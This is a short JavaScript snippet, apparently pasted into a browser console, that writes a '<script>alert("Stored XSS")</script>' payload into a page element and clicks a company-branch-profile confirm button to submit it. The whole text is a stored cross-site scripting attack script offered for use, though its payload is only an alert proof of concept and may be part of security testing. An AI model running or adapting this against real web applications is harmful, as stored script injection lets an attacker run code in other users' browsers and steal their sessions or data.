// Inject XSS payload into the input field
const inputField = document.querySelector('#webDiv'); // Replace with the correct selector
if (inputField) {
    inputField.innerHTML = '<script>alert("Stored XSS");</script>';
} else {
    console.error('Input field not found!');
}

// Simulate a click on the confirm button
const confirmButton = document.querySelector('#cmpny_branch_profile_cnfrm'); // Replace with the button's selector
if (confirmButton) {
    confirmButton.click();
} else {
    console.error('Confirm button not found!');
}
